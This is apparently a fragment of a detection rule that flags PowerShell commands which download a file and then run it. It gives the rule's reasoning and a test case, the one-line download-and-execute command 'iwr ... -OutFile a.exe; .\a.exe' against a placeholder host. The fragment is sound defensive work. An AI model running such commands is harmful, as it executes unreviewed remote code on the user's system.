  confidence: 0.9
  reason: >-
    A file downloaded from the network (Invoke-WebRequest -OutFile,
    curl.exe -o, Start-BitsTransfer) and then run by a later command of the
    same text (.\file, & path, Start-Process, msiexec, powershell -File):
    unreviewed remote code, the PowerShell spelling of curl -o x URL &&
    bash x. A run through a computed path (& "$env:TEMP\x.exe") is not read;
    the lane notes the computed name.
  tests:
    tp:
    - 'iwr https://dl.example/a.exe -OutFile a.exe; .\a.exe'
